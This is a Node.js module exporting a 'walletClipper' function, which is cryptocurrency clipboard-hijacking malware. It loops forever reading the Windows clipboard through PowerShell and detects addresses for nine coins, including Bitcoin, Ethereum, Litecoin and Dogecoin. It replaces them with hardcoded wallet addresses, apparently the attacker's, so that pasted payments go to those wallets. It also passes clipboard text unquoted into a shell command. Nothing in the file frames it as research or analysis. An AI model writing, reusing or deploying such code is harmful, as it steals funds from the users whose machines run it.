const child_process = require("child_process")

class BlockChain {
    constructor(adress, regex) {
        this.adress = adress;
        this.regex = regex;
    }
}

function walletClipper() {
    const blockchains = [
        new BlockChain("bc1qzgr9wcq28tu9md02rfp5f4tjvsguz7x2a00eye", new RegExp("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$")), // btc
        new BlockChain("LUkCrDuUBPGH9uVQQHFS5hyi1xPJ38cbUb", new RegExp("(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)")), // ltc
        new BlockChain("GBYNIZIJWZT7I2VTCVASDKIM6OXRKNRN4MVS6NTG2L23EIBQENPS5ZA7", new RegExp("(?:^G[0-9a-zA-Z]{55}$)")), // xlm
        new BlockChain("rEV2y4T7KK8omqxZxehhTo4noENPAywWX7", new RegExp("(?:^r[0-9a-zA-Z]{24,34}$)")), // xrp
        new BlockChain("qqssukdtcxnhz39pck6e3rewa77chk4vwvfx997xk9", new RegExp("^((bitcoincash:)?(q|p)[a-z0-9]{41})")), // bch
        new BlockChain("XhBFpa8b82yrfddpge84iHT1VHVLd3eUeF", new RegExp("(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)")), // dash
        new BlockChain("APP3xgw31kAmrLzmzwsq1QRzqiVJwDFQ2T", new RegExp("(?:^A[0-9a-zA-Z]{33}$)")), // neo
        new BlockChain("DPZVdUE2tq9DRY7AqwZq79kmPWVfouqutq", new RegExp("D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}")), // doge
        new BlockChain("0xb95C23e1aE44b00C160546eb70D383563142A1AE", new RegExp("(?:^0x[a-fA-F0-9]{40}$)")) // eth
    ];

    while (true) {
        try {
            const paste = child_process.execSync(`powershell Get-Clipboard`).toString("utf8").replace("\r", "");
            let text = paste;
            let dtc = false;

            for (let i = 0; i < blockchains.length; i++) {
                const blockchain = blockchains[i];

                for (let line of text.split("\n")) {
                    if (line == blockchain.adress) {
                        break;
                    }
                    if (blockchain.regex.test(line.replace("\r", ""))) {
                        dtc = true;
                        text = text.replace(line, blockchain.adress);
                    }
                }

                if (dtc) {
                    child_process.execSync(`powershell Set-Clipboard ${text}`);
                }
            }

        } catch (e) { };
    }
};

module.exports = {
    walletClipper
}